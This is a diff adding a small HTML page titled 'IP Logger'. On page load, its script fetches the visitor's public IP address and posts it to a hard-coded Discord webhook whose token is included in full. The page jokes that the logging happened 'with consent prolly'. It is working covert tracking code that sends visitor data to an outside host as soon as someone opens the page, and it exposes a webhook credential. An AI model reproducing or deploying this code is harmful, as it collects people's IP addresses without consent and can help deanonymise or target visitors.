@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Cool</title>
+    <style>
+        body {
+            background-color: #0f0f0f;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 100px;
+        }
+        .container {
+            background: #1a1a1a;
+            border-radius: 12px;
+            padding: 40px;
+            display: inline-block;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>IP Logger</h1>
+        <p>Your IP address has been logged (With consent prolly)</p>
+        </div>
+
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1358595258878791891/lvOdRKLnfTeGJ3bBF6Rrlm8crKvZAqJ32MgTsMpxemNWuGsDJXPY2ccaA1TYxaBOx11H";
+
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                const payload = {
+                    content: `IP Log!\nIP Address: ${ip}`
+                };
+
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            })
+            .catch(error => console.error('Error fetching IP:', error));
+    </script>
+</body>
+</html>
